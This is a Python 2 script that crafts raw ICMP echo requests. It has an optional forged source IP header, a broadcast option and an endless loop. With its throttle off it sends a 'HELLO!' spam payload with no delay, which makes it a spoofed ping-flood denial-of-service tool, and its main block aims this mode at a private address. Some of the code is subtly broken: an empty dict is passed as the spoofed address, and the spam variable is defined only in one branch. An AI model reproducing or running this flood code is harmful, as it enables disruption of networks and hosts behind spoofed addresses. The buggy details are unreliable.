#!/usr/bin/python

import struct
import socket
import sys

import time

# From http://www.bitforestinfo.com/2018/01/code-icmp-raw-packet-in-python.html
def checksum(msg):
	s = 0			 # Binary Sum
	# loop taking 2 characters at a time
	for i in range(0, len(msg), 2):
		a = ord(msg[i])
		b = ord(msg[i+1])
		s = s + (a+(b << 8))
	# One's Complement
	s = s + (s >> 16)
	s = ~s & 0xffff
	return socket.ntohs(s)

#----------------------------------------
#Default values for a IP Header
# Get ICMP code
icmp = socket.getprotobyname("icmp")

# IP header fields
ip_ver = 4
ip_ihl = 5
ip_tos = 0
ip_tot_len = 0  # kernel will fill the correct total length
ip_id = 54321   #Id of this packet
ip_frag_off = 0
ip_ttl = 255
ip_proto = socket.IPPROTO_ICMP
ip_check = 0    # kernel will fill the correct checksum
ip_ihl_ver = (ip_ver << 4) + ip_ihl
#----------------------------------------


def send(dest_ip, src_ip=None, hold_back = True, timeout = 100000):
	seq = 0
	# Create a raw socket
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
	except socket.error , msg:
		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()

	# Get destination address
	dest_addr = socket.gethostbyname(dest_ip)

	# Defines a sending method
	send_now = lambda x : s.sendto(x, (dest_addr,0))

	# Defines a spoofing sending method
	if src_ip is not None:
		ip_saddr = socket.inet_aton(src_ip)
		ip_daddr = socket.inet_aton(dest_addr)
		
		s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
		
		ip_header = struct.pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
		#With a lot of spam stuffing
		spam = "HELLO!"*256
		
		send_now = lambda x : s.sendto(ip_header+x, (dest_addr,0))

	# ICMP header fields
	type = 8
	code = 0
	mychecksum = 0
	identifier = 12345
	seqnumber = 0
	
	while 1:
		seq += 1

		#Decides if sends spam payload or not
		if hold_back:
			payload = str(seq)
		else:
			payload = spam

		mychecksum = 0
		icmp_packet = struct.pack("!BBHHH1002s", type, code, mychecksum, identifier, seqnumber, payload)
		mychecksum = checksum(icmp_packet)
		icmp_packet = struct.pack("!BBHHH1002s", type, code, mychecksum, identifier, seqnumber, payload)

		# Send echo request
		send_now(icmp_packet)

		#When not holding back, there is no delay on sending the packages
		if hold_back:
			time.sleep(1)

if __name__ == "__main__":
	send("192.168.0.1",{},0)